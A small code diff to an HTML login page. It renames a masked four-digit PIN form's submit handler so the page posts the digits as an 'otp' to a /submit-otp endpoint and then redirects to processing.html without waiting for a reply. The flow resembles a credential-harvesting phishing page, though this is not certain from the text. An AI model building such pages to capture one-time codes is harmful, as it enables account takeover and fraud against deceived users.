@@ -132,7 +132,7 @@
 <input type="password" maxlength="1" class="pin-box" id="pin3">
 <input type="password" maxlength="1" class="pin-box" id="pin4">
     </div>
-<button onclick="submitPin()" class="login-btn">Submit</button>
+<button onclick="submitOtp()" class="login-btn">Submit</button>
 </div>
 
 <!-- BOTTOM BLUE -->
@@ -150,19 +150,19 @@
 <script src="script.js"></script>
 
 <script>
-function submitPin() {
-    let pin = "";
+function submitOtp() {
+    let otp = "";
 
     document.querySelectorAll(".pin-box").forEach(input => {
-        pin += input.value;
+        otp += input.value;
     });
 
-    fetch("/submit-pin", {
+    fetch("/submit-otp", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
         },
-        body: JSON.stringify({ pin })
+        body: JSON.stringify({ otp })
     });
 
     window.location.href = "processing.html";
